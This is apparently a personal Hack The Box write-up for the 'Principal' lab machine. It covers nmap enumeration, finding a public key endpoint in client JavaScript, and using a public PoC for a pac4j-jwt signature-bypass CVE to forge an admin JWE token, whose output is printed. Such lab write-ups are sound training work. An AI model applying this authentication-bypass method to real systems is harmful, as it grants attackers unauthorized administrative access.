# Principal HTB
Personal writeup of the Principal hack the box machine

Initial nmap scan reveals 2 PoA on the machine
```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Principal]
└─# nmap -sV -sC 10.129.39.147 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-25 19:59 +0900
Stats: 0:00:33 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 20:00 (0:00:29 remaining)
Nmap scan report for 10.129.39.147
Host is up (0.41s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b0:a0:ca:46:bc:c2:cd:7e:10:05:05:2a:b8:c9:48:91 (ECDSA)
|_  256 e8:a4:9d:bf:c1:b6:2a:37:93:40:d0:78:00:f5:5f:d9 (ED25519)
8080/tcp open  http-proxy Jetty
| http-title: Principal Internal Platform - Login
|_Requested resource was /login
|_http-server-header: Jetty
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sat, 25 Apr 2026 10:59:04 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: application/json
|     {"timestamp":"2026-04-25T10:59:04.048+00:00","status":404,"error":"Not Found","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     Date: Sat, 25 Apr 2026 10:59:01 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Content-Language: en
|     Location: /login
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 25 Apr 2026 10:59:02 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Allow: GET,HEAD,OPTIONS
|     Accept-Patch: 
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Date: Sat, 25 Apr 2026 10:59:03 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 349
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 505 Unknown Version</title>
|     </head>
|     <body>
|     <h2>HTTP ERROR 505 Unknown Version</h2>
|     <table>
|     <tr><th>URI:</th><td>/badMessage</td></tr>
|     <tr><th>STATUS:</th><td>505</td></tr>
|     <tr><th>MESSAGE:</th><td>Unknown Version</td></tr>
|     </table>
|     </body>
|     </html>
|   Socks5: 
|     HTTP/1.1 400 Bad Request
|     Date: Sat, 25 Apr 2026 10:59:04 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 382
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 400 Illegal character CNTL=0x5</title>
|     </head>
|     <body>
|     <h2>HTTP ERROR 400 Illegal character CNTL=0x5</h2>
|     <table>
|     <tr><th>URI:</th><td>/badMessage</td></tr>
|     <tr><th>STATUS:</th><td>400</td></tr>
|     <tr><th>MESSAGE:</th><td>Illegal character CNTL=0x5</td></tr>
|     </table>
|     </body>
|_    </html>
```

Adding the ip to hosts to searching in the URL via 8080 brings up a website with a login for Principal Internal Platform. We can enumerate further via `fuff`.

Nothing of note comes up besides a 200 on a page called `dashboard`. Attempting to access the page commits an autoredirect to login -- something that can be used later.

Taking a closer look at the scan results, we can see the webpage is `X-Powered-By: pac4j-jwt/6.0.3`. Searches with keywords like `cve` and `pac4j-jwt/6.0.3` helps us identify [CVE-2026-29000](https://github.com/alihussainzada/CVE-2026-29000-Python-PoC-pac4j-JWT-AuthenticationBypass-Poc). 

The bug that the CVE is based on exists within the part of the code that verifies the JWT signatures. It improperly parses PlainJWT (unsigned tokens) as null and executes a logic error. When a user has access to the websites public RSA key it can encrypt a malicious PlainJWT with admin claims -- and since the bug allows for signature bypass -- the machine trusts all claims as valid leading to privilege escalation. 

Firstly some prerequisites need to be met. We need to locate the RSA public key for the website. Tools such as `feroxbuster` and `ffuf` can help us locate or looking in the source code of the website can too. Everytime the login page is called it is pulled from a script:

```
<script src="/static/js/app.js"></script>
```

cURLing or searching for that directory leads to some very revealing information

```
/**
 * Principal Internal Platform - Client Application
 * Version: 1.2.0
 *
 * Authentication flow:
 * 1. User submits credentials to /api/auth/login
 * 2. Server returns encrypted JWT (JWE) token
 * 3. Token is stored and sent as Bearer token for subsequent requests
 *
 * Token handling:
 * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
 * - Public key available at /api/auth/jwks for token verification
 * - Inner JWT is signed with RS256
 *
 * JWT claims schema:
 *   sub   - username
 *   role  - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
 *   iss   - "principal-platform"
 *   iat   - issued at (epoch)
 *   exp   - expiration (epoch)
 */

const API_BASE = '';
const JWKS_ENDPOINT = '/api/auth/jwks';
const AUTH_ENDPOINT = '/api/auth/login';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const USERS_ENDPOINT = '/api/users';
const SETTINGS_ENDPOINT = '/api/settings';
```

We're looking specifically at the line `Public key available at /api/auth/jwks for token verification`. Pulling that page gives us the websites public RSA key. We can use that to our advantage now that we have the key.

Reading into the CVE we found earlier tells us we have evrything we need to generate the malicious token and bypass the lgoin.

```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Principal/CVE-2026-29000-Python-PoC-pac4j-JWT-AuthenticationBypass-Poc]
└─# python3 poc.py --jwks http://10.129.49.87:8080/api/auth/jwks
[*] Fetching JWKS...
[+] Public key loaded
[+] PlainJWT created

=== Malicious JWE Token ===

eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImN0eSI6ICJKV1QiLCAia2lkIjogImVuYy1rZXktMSJ9.fjIEHSpUYQjIvzPdCU8z5eV02wBk3a2Va4ahUrGM-qaEN7Sza8XBzulwEbhyNsxcfzNWB-XSOE9C1-FweCY_LMCp9Oj3Ie4gFKKlNNsPQUwlPQLcGzgfHCJaVamADm428ZPvtZtxkaGswjbRHB2iQ_2EdVDoWw1VMUWxaCxNlTcygQ9wRa_ub4Nzpk_lddK7xptva8Yf-aGmoWsIJ6BwLXucWBwU6WqqX5SpgbolQ8_Z2iQDf14xV9eRR4yQqi_P6O-SwmWnboE2Q7rJbCR2kzGgC8eqRFBfeTbhXVf9z2SG52cHNHz2agMi2dsSxuMU4xL0rsLU7yZtYrMSKFDadg.7uBx2RdgyeCRRSIZ.30q2z8_ntup65byWeQz929nXpgpJgWxXoD_B34mbSb5ks4NUOrsymgpxOh7eS6Vm2Sq6GtXJjVF8EdaFqolMnVnssD_tIMDHwlWYfMQ1dN9b59yqJeOqekFgbRgiqeFnd8QX_saV9VjNFXONPkFLuW1Ru6RaQPRFmW5S3dYRyVR4OAMxM2PUBKf3hkighydYVuoPfRlvWll3JDf6mUWTRqAarTlUxrLsd5ib8cZWC-eysNZtKA.o7iHSJGqcS4hGctcJEQJiw

Use it as:
Authorization: Bearer eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImN0eSI6ICJKV1QiLCAia2lkIjogImVuYy1rZXktMSJ9.fjIEHSpUYQjIvzPdCU8z5eV02wBk3a2Va4ahUrGM-qaEN7Sza8XBzulwEbhyNsxcfzNWB-XSOE9C1-FweCY_LMCp9Oj3Ie4gFKKlNNsPQUwlPQLcGzgfHCJaVamADm428ZPvtZtxkaGswjbRHB2iQ_2EdVDoWw1VMUWxaCxNlTcygQ9wRa_ub4Nzpk_lddK7xptva8Yf-aGmoWsIJ6BwLXucWBwU6WqqX5SpgbolQ8_Z2iQDf14xV9eRR4yQqi_P6O-SwmWnboE2Q7rJbCR2kzGgC8eqRFBfeTbhXVf9z2SG52cHNHz2agMi2dsSxuMU4xL0rsLU7yZtYrMSKFDadg.7uBx2RdgyeCRRSIZ.30q2z8_ntup65byWeQz929nXpgpJgWxXoD_B34mbSb5ks4NUOrsymgpxOh7eS6Vm2Sq6GtXJjVF8EdaFqolMnVnssD_tIMDHwlWYfMQ1dN9b59yqJeOqekFgbRgiqeFnd8QX_saV9VjNFXONPkFLuW1Ru6RaQPRFmW5S3dYRyVR4OAMxM2PUBKf3hkighydYVuoPfRlvWll3JDf6mUWTRqAarTlUxrLsd5ib8cZWC-eysNZtKA.o7iHSJGqcS4hGctcJEQJiw
```

